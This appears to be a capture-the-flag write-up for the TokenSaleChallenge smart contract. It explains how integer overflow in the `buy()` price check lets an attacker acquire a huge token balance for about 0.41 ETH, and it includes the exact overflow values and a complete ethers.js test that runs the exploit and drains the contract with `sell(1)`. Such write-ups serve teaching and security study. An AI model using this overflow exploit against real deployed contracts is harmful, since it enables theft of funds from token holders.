The exploit in the token sale contract uses integer overflow to manipulate `msg.value` and `numTokens` in the `buy()` function, allowing the attacker to acquire more tokens for a lower cost.

The vulnerable line in the contract is:

`require(msg.value == numTokens * PRICE_PER_TOKEN);`

In order to bypass this requirement, the attacker calculates the following values:

1. `2^256 / 10^18 + 1 = 115792089237316195423570985008687907853269984665640564039458`
2. `(2^256 / 10^18 + 1) * 10^18 - 2^256 = 415992086870360064 ~= 0.41 ETH`

The first calculation is done to determine the number of tokens (`numTokens`) the attacker will purchase. The number is derived from the maximum possible value of a `uint256` (MAX_UINT) divided by `10^18`, which is the value of 1 ether in wei, and then incremented by 1.

The second calculation determines the overflow value that will be sent as `msg.value`. When the calculated `numTokens` is multiplied by the `PRICE_PER_TOKEN` (1 ether in wei), the result causes an integer overflow, resulting in a smaller value than expected. In this case, the overflow value is approximately 0.41 ETH.

By sending these calculated values to the `buy()` function, the attacker can obtain a large number of tokens (115792089237316195423570985008687907853269984665640564039458) by only spending 0.41 ETH, instead of the expected 1 ETH per token.

```javascript
it("Successfully completes the test", async function () {
  const [signer] = await ethers.getSigners();
  const userAddress = await signer.getAddress();

  const TokenSaleChallenge = await ethers.getContractFactory(
    "TokenSaleChallenge"
  );
  const tokenSaleContract = await TokenSaleChallenge.deploy(userAddress, {
    value: ethers.utils.parseEther("1"),
  });
  await tokenSaleContract.deployed();

  // msg.value == numTokens * PRICE_PER_TOKEN
  // 2^256 / 10^18 + 1 = 115792089237316195423570985008687907853269984665640564039458
  // (2^256 / 10^18 + 1) * 10^18 - 2^256 = 415992086870360064 ~= 0.41 ETH

  // (MAX_UINT / 10^18) + 1 = 115792089237316195423570985008687907853269984665640564039458
  // Overflow: 415992086870360064, a little bit below half an ether
  const purchaseTx = await tokenSaleContract.buy(
    "115792089237316195423570985008687907853269984665640564039458",
    {
      value: "415992086870360064",
    }
  );
  await purchaseTx.wait();

  const sellTransaction = await tokenSaleContract.sell(1);
  await sellTransaction.wait();

  expect(await tokenSaleContract.isComplete()).to.be.true;
});
```

After purchasing these tokens, the attacker can then call the `sell()` function to sell just 1 token, which returns 1 ETH. As a result, the contract's balance drops below 1 ETH completing the challenge.
